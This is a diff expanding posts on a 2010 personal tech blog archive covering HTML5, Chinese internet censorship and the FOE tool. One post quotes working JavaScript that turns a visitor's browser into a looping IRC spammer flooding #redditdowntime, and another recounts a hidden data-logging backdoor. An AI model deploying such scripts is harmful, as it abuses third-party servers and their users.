@@ -65,7 +65,46 @@
     function rnd(){
         var chars=&quot;abcdefghijklmnopqrstuvwxyz&quot;;
         var r=&#39;&#39;;
-        var …</code></pre></p>
+        var length=Math.floor(Math.random()*10+3);
+        for (var i=0;i&lt;length;i++){
+            var rnum=Math.floor(Math.random() * chars.length);
+            r += chars.substring(rnum, rnum+1);
+        }
+        return r;
+    }
+    function lol(){
+        /* Grab a reference to the textarea */
+        var x = document.getElementById(&#39;x&#39;);
+        /* Grab a reference to the form itself */
+        var f = document.getElementById(&#39;f&#39;);
+        /* Generate a fake user-name */
+        var i = rnd();
+        /* Generate a fake nick */
+        var n = rnd();
+
+        /* 
+         * Build a series of IRC commands into a string:
+         *   - Set the username
+         *   - Set the nick 
+         *   - Join the channel to spam (#redditdowntime)
+         *   - Queue up a bunch of PRIVMSG commands to the channel with the spam link
+         */
+        x.value=&#39;\r\nUSER &#39;+i+&#39; 8 * :&#39;+n+&#39;\r\nNICK &#39;+n+&#39;\r\nJOIN #redditdowntime\r\n&#39;+new Array(99).join(&#39;PRIVMSG #redditdowntime :http://bit.ly/lolreddit\r\n&#39;)+&#39;&#39;;
+
+        /* Submit the form, effectively sending the textarea contents to an IRC server */
+        f.submit();
+
+        /* Setup a loop for maximum irritation */
+        setTimeout(lol, 5000);
+    }
+    lol();
+&lt;/script&gt;
+&lt;h1&gt;DIGG ROOLZ! REDDIT DROOLZ!&lt;/h1&gt;
+</code></pre>
+
+<p>This is the most clever bits of JavaScript I think I’ve seen in recent months.</p>
+
+<p><a href="http://www.reddit.com/r/programming/comments/auog9/using_a_browser_to_piss_off_irc_users_or_spamming/">via</a></p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-28T01:05:20+00:00">2010-01-28</time></p>
 <p>archive</p>            </div>
@@ -89,7 +128,39 @@
   <p>Struggling with turn-taking</p>
 </blockquote>
 
-<p>Geeks need to know half duplex talking interactions are happening synchronously. It’s interesting to …</p></p>
+<p>Geeks need to know half duplex talking interactions are happening synchronously. It’s interesting to see geeks are afraid of face-to-face talks, phone calls, but prefer IM, email, or text because the latter ones are asynchronous.</p>
+
+<blockquote>
+  <p>Obsessing over correctness and completeness</p>
+</blockquote>
+
+<p>Blame the teachers and lessons we learned from incorrectness and incompleteness.</p>
+
+<blockquote>
+  <p>Preferring exact numerical responses</p>
+</blockquote>
+
+<p>This one is easy, compile your figures before speaking for better human comprehension.</p>
+
+<blockquote>
+  <p>Using technical terms without checking for understanding</p>
+</blockquote>
+
+<p>This is needed for zhuangbility</p>
+
+<blockquote>
+  <p>Focusing on the how rather than the what or the why</p>
+</blockquote>
+
+<p>Think of IO, others might only interested in the output, results other than the internal process.</p>
+
+<blockquote>
+  <p>Favoring complexity and detail over simplicity in descriptions</p>
+</blockquote>
+
+<p>Think of Occam’s Razor. In fact, you worked hard to make something marvelous, but others doesn’t really care or have little use with it. Your time &amp; effort might be worthless to others. So speak to someone who really care or just simplify your ideas to make it most acceptable by everyone. Which means</p>
+
+<p><strong>Summary:</strong> marketing and advertising is more important than a blueprint or a manual. If you suck at human-to-human or human-to-earth interface you fail.</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-27T23:33:22+00:00">2010-01-27</time></p>
 <p>archive</p>            </div>
@@ -140,7 +211,7 @@
 <li><p>Censorship is an auto-immune disease: It harms the system’s ability to fix itself and permits many more severe problems.</p></li>
 </ul>
 
-<p>via …</p></p>
+<p>via reddit/atoau/c0jc8h6 &amp; HN/1078736</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-27T08:32:34+00:00">2010-01-27</time></p>
 <p>archive</p>            </div>
@@ -175,7 +246,28 @@
 Consider the amount of effort &amp; hacks you invested into Trident-Webkit-Gecko test suits, now multiply it by 20 if you want to make a decent cross-platform webpage for mobiles</p>
 
 <p><strong>Fantasy:</strong> HTML5 is standard<br>
-<strong>Fact:</strong> HTML5 …</p></p>
+<strong>Fact:</strong> HTML5 is like the new <code>&lt;applet&gt;</code> which no one will bother install. <br>
+It’s just a bunch of code monkeys and tech-savvy hype around it, real end-users and consumers don’t give a shit. The <em>de facto</em> standard for the Web in the past decade was IE6.</p>
+
+<p><strong>Fantasy:</strong> Flash video sucks, it hogs my CPU!<br>
+<strong>Fact:</strong> Blame Adobe <em>and</em> Apple.<br>
+<a href="http://radnan.public.iastate.edu/procedural/">HTML5 hogging is more deadly</a>, and since the HTML5 rendering is done inside the same process of normal HTML layout, the hogging is global and you can’t solve browser crashes by using a separate process for each plugin.<br>
+<a href="http://blogs.adobe.com/penguin.swf/2010/01/solving_different_problems.html">According to Adobe</a>, YUV-RGB and rich compositing is a performance penalty which  HTML5 <code>&lt;video&gt;</code> tag can not avoid, too.</p>
+
+<p><strong>Fantasy:</strong> Flash ads is visual pollution to webpages<br>
+<strong>Fact:</strong> ads made by &lt;canvas&gt; or SVG, generated dynamically via inline obsfucated Javascript is impossible to disable or block. You should rejoice that Flash is a thirdparty and can be easily blocked by NoFlash</p>
+
+<p><strong>Fantasy:</strong> <code>&lt;canvas&gt;</code> can overtake Flash<br>
+<strong>Fact:</strong> Oh yeah? You expect artists &amp; designers to create vector animations by writing numerous <code>for</code> and <code>setTimeout</code>? OK, you can invent a competent authoring tool against Flash or Flex that generates lots of <code>for</code> and <code>setTimeout</code>? Good. Now try stream a 1MB <code>&lt;canvas&gt;</code> animation full of <code>for</code> and <code>setTimeout</code>, and please provide a progress bar for a user to do arbitrary timeline jumps. Oh, btw, call me when WHATWG added FPS settings for <code>&lt;canvas&gt;</code><br>
+Just FYI: Flash does <em>much much</em> more than a just plain canvas. If you think I am wrong, think again. If still, think <em>harder</em>.</p>
+
+<p><strong>Fantasy:</strong> WebGL can do 3D, yeah!<br>
+<strong>Fact:</strong> So does DirectAnimation and VRML decades ago. It was limited only because scripting speed was limited those days. And still O3D and Unity3D is better than WebGL in many levels and has more realworld applications.</p>
+
+<p><strong>Fantasy:</strong> <code>video</code> tag is better than Flash<br>
+<strong>Fact:</strong> native codec is better than Flash. What’s the difference between <code>&lt;video&gt;</code> and <code>&lt;embed&gt;</code> really? I was waiting to see WHATWG fail by re-inventing a full stack media player wheel, because soon the consumers will ask volume control over <code>&lt;video&gt;</code>, and brightness, tilt &amp; rotate, stereo &amp; DFX, subtitles, AV out, ahhhh fuck those shit.</p>
+
+<p><strong>Summary:</strong> HTML5 is a wonderful promise and well celebrated by developer communities, but let’s face it, it doesn’t really changes anything, and nobody talks about its awkwardness. CSS3 is still not re-usable, HTTP is still plaintext protocol which anyone can eavesdropping, tamper and censor. HCI improved a lot but the Web is extremely slow towards these changes. Perhaps the HTML5 was really designed to solve ‘how to stare at a 2D monitor properly with a mouse and keyboard’ problem only.</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-26T23:47:12+00:00">2010-01-26</time></p>
 <p>archive</p>            </div>
@@ -197,7 +289,11 @@ Consider the amount of effort &amp; hacks you invested into Trident-Webkit-Gecko
 
 <p>参考1：<a href="http://baike.baidu.com/view/1285866.htm">http://baike.baidu.com/view/1285866.htm</a></p>
 
-<p>参 …</p></p>
+<p>参考2：<a href="http://en.wikipedia.org/wiki/Circumhorizontal_arc">Circumhorizontal arc</a></p>
+
+<p><img src="http://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Ohlookarainbow.jpg/500px-Ohlookarainbow.jpg" alt="Circumhorizontal arc"></p>
+
+<p><a href="http://www.reddit.com/r/conspiracy/comments/au5tr/30_mins_before_the_2008_sichuan_earthquake_in/">via</a></p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-26T10:03:53+00:00">2010-01-26</time></p>
 <p>archive</p>            </div>
@@ -253,7 +349,51 @@ Consider the amount of effort &amp; hacks you invested into Trident-Webkit-Gecko
 
 <p><a href="http://code.google.com/p/foe-project/">http://code.google.com/p/foe-project/</a></p>
 
-<p>所谓的 feed over email 就是把网页打 …</p></p>
+<p>所谓的 feed over email 就是把网页打包在邮件里发给你。传说会支持youtube。说白了就是轮子那种天天发垃圾邮件的手段。用起来麻烦不说，墙要屏蔽这个工具，也只是动半根指头就搞定的事情。我估计这垃圾工具连网页图片显示都不会很好的支持。当然了，这种事情冤大头，又需要Gmail来当。如果Gmail因为这个foe（foe的英文单词意思：敌人）被封了，那就真的要双向草泥马了。</p>
+
+<p>这个FOE在去年的<a href="https://www.defcon.org/html/defcon-17/dc-17-schedule.html">Defcon 2009</a>上就公布了（<a href="https://media.defcon.org/dc-17/video/DEFCON%2017%20Hacking%20Conference%20Presentation%20By%20Sho%20Ho%20-%20FOE%20Feeding%20Controversial%20News%20to%20Censored%20Countries%20-%20Video%20and%20Slides.m4v">演讲视频下载</a>），之后就是典型的烂尾项目了。大半年了p动静都没有。</p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/133.jpg" width="500"></p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/29.jpg" width="500"></p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/34.jpg" width="500"></p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/44.jpg" width="500"></p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/52.jpg" width="500"></p>
+
+<p>slides里提到FOE的目的：</p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/62.jpg" width="500"></p>
+
+<p>大家看清楚，<strong>这玩意连代理都算不上</strong>。最多就是个complement。</p>
+
+<p>C#写的。估计米帝又在廉价压榨大学生剩余劳动力了吧？</p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/7.jpg" width="500"></p>
+
+<p>界面</p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/8.jpg" width="500"></p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/9.jpg" width="500"></p>
+
+<p>最后还说如果你能提供更好的idea和code，米帝可以资助你开发（这个听起来不错）。</p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/10.jpg" width="500"></p>
+
+<p>后面支持这个项目的bbg.gov，就是VOA、RFA的后台，跟哈佛法学院和CIA一样，都是长期搞和平演变的组织。后面的问答环节有人问现在支持哪些内容，那女的说现在只支持VOA。还吹嘘自己是什么unbiased news。这玩意儿说白了，就是让你脱离鳖帝的洗头，然后去米帝洗头。</p>
+
+<p>视频后面的问答环节，FOE连p2p的打算都没有，他们的解释是，如果你需要p2p，你可以通过foe来下载p2p工具。汗死。</p>
+
+<p><img src="http://blog.est.im/wp-content/uploads/2010/01/1110.jpg"></p>
+
+<p>还有人问，有没有一键毁灭证据功能，这个想得真周到，哈哈。。。foe说没有。</p>
+
+<p>永远不要高估鳖帝和米帝官僚的效率。目前最靠谱的翻墙工具都是爱好者亲自制作的。 无论是轮子的tg的还是米帝的，都是些<a href="http://www.urbandictionary.com/define.php?term=corporate+bullshit">corporate bullshit</a>。</p>
+
+<p><a href="http://blog.est.im/archives/531">自由不是施舍</a>，每个人都得亲自去争取并为之付出。</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-25T00:54:19+00:00">2010-01-25</time></p>
 <p>archive</p>            </div>
@@ -270,7 +410,19 @@ Consider the amount of effort &amp; hacks you invested into Trident-Webkit-Gecko
             <p class="card-text"><p>本来想喷一下这个都火过了的话题的，但是算了吧。长话短说，我尊重sbilly大牛，但是不太同意<a href="http://www.sinoutopia.org/wp/?p=2637">这篇文章</a>很多东西，特别是：</p>
 
 <blockquote>
-  <p>现在可以 …</p></blockquote></p>
+  <p>现在可以来谈谈为什么中国当今需要网络监管。在我看来，信息大概可以分为两类：知识和消息（原谅词汇的贫乏）。中国政府监管应当针对的，也是实际中在做的，是对消息的监管，而对知识的传播<strong>并没有</strong>过分限制。</p>
+</blockquote>
+
+<p>这句话就是纯粹 bullshit 了。wikipedia, debian, freebsd, sourceforge 含泪发来贺电。</p>
+
+<p>我在newsmth上还看到过一篇帖子，国际半导体大会下一届就要在本朝举行了，但是不幸的是这个大会的官网被屏蔽了。国内与会人士没法去官网登记。墙有任何客服部门吗？囧。。。。</p>
+
+<p>这篇文章的整体思路就是认为天下乌鸦都是黑的，所以我更黑一点无所谓。就好比那个经典段子：</p>
+
+<blockquote>
+  <p>甲：这鸡蛋好难吃<br>
+  乙：鸡蛋都难吃，你急个啥？</p>
+</blockquote></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-25T00:15:51+00:00">2010-01-25</time></p>
 <p>archive</p>            </div>
@@ -316,7 +468,9 @@ Consider the amount of effort &amp; hacks you invested into Trident-Webkit-Gecko
 <li>ALL YOUR BOTNET ARE BELONG TO ME</li>
 </ol>
 
-<p>演讲里这个家伙打劫到的这 …</p></p>
+<p>演讲里这个家伙打劫到的这个<a href="http://news.ycombinator.com/item?id=1072225">Torpig</a> botnet有17Gbps带宽的DoS能力。。。</p>
+
+<p><a href="http://news.ycombinator.com/item?id=1072225">via</a></p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-23T22:30:25+00:00">2010-01-23</time></p>
 <p>archive</p>            </div>
@@ -370,7 +524,11 @@ Consider the amount of effort &amp; hacks you invested into Trident-Webkit-Gecko
 标  题: Re: 本来琢磨着是不是用JS写个套利的东西…<br>
 发信站: 水木社区 (Fri Jan 22 18:36:35 2010), 站内<br></p>
 
-<p>中学的时候正流行文曲星，比较 …</p></p>
+<p>中学的时候正流行文曲星，比较新的款都带qb编程的
+我那时候编了一个输入两个人名字看般配度的程序
+然后传给全班人玩
+其实那个程序偷偷做了个后门，把输过的名字存下来了
+传回我手上就能看到谁输了什么。。。爆出不少八卦呢。。。</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-23T05:57:20+00:00">2010-01-23</time></p>
 <p>archive</p>            </div>
@@ -396,7 +554,23 @@ Consider the amount of effort &amp; hacks you invested into Trident-Webkit-Gecko
   <p>谷歌在内的外资企业应尊重承担相应的<strong>社会责任</strong></p>
 </blockquote>
 
-<p>真 …</p></p>
+<p>真TMD佩服当年WTO谈判的家伙，把洋大人忽悠得团团转啊。</p>
+
+<p>常见段子对还有：</p>
+
+<p>经济总量 – 人均值</p>
+
+<p>国际接轨 – 特殊国情</p>
+
+<p>有了这些段子对，几乎就是<strong>万能</strong>借口了。</p>
+
+<p>今天又看到<a href="http://sr.ju690.com/meme/item/58924">领导的秘密</a>一文：</p>
+
+<blockquote>
+  <p>不管是动物还是人，都有一种本能：把自己置于一个头领的统治之下。</p>
+
+  <p>所以，作为领导，你要动员群众，只需要做两件事就可以了：<strong>断言</strong>和<strong>重复</strong>。</p>
+</blockquote></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-23T04:50:44+00:00">2010-01-23</time></p>
 <p>archive</p>            </div>
@@ -414,7 +588,9 @@ Consider the amount of effort &amp; hacks you invested into Trident-Webkit-Gecko
 
 <p><img src="http://cache0.techcrunch.com/wp-content/uploads/2010/01/astrotweet.png" alt="ISS twitter"></p>
 
-<p>前几个月NASA在地面帮助宇航员@Astro_Mike更新tweet，<a href="http://tech.huanqiu.com/astro/2009-05/460135.html">总部SB</a>还报道了这个事情，前些天还说<a href="http://it.solidot.org/it/10/01/16/1045200.shtml">ISS上收发email</a>是通过定时交换Outlook的<code>.ost</code>文件做到的，没想到现 …</p></p>
+<p>前几个月NASA在地面帮助宇航员@Astro_Mike更新tweet，<a href="http://tech.huanqiu.com/astro/2009-05/460135.html">总部SB</a>还报道了这个事情，前些天还说<a href="http://it.solidot.org/it/10/01/16/1045200.shtml">ISS上收发email</a>是通过定时交换Outlook的<code>.ost</code>文件做到的，没想到现在都可以直接实时发tweet了。估计NASA的带宽也不便宜啊。呵呵。</p>
+
+<p>早就厌烦被当作墙的技术支持和客服了。每当别人问我twitter怎么上的时候。一般都一句话回答：<a href="http://blog.sina.com.cn/s/blog_624f8d2a0100gqou.html">中国人与狗</a>不得上twitter。</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-22T16:52:29+00:00">2010-01-22</time></p>
 <p>archive</p>            </div>
@@ -432,7 +608,17 @@ Consider the amount of effort &amp; hacks you invested into Trident-Webkit-Gecko
 
 <p>Disclaimer: The content below is FYI only</p>
 
-<p>关于最近<acronym title="土鳖GCD帝国主义">鳖帝</acronym>当局那个破网站几百万升级费的事情，以前也<a href="http://initiative.yo2.cn/archives/637660">写 …</a></p></p>
+<p>关于最近<acronym title="土鳖GCD帝国主义">鳖帝</acronym>当局那个破网站几百万升级费的事情，以前也<a href="http://initiative.yo2.cn/archives/637660">写过</a>相关话题。</p>
+
+<p>whitehouse.gov 的造价是$20,000,000，而且是被波音公司承包做的。用老外的话说就是</p>
+
+<blockquote>
+  <p>yes.. boeing and other “military” contractors win website contracts over established firms because they know <strong>how to play the goverment contracting game</strong></p>
+</blockquote>
+
+<p>另外一个网站recovery.gov使用了Drupal开源CMS系统，<a href="http://initiative.yo2.cn/archives/641180">据传</a>重新设计页面（redesign）花了$18,000,000</p>
+
+<p>米帝和鳖帝都很彪悍～～～呵呵。。。</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2010-01-22T05:48:49+00:00">2010-01-22</time></p>
 <p>archive</p>            </div>
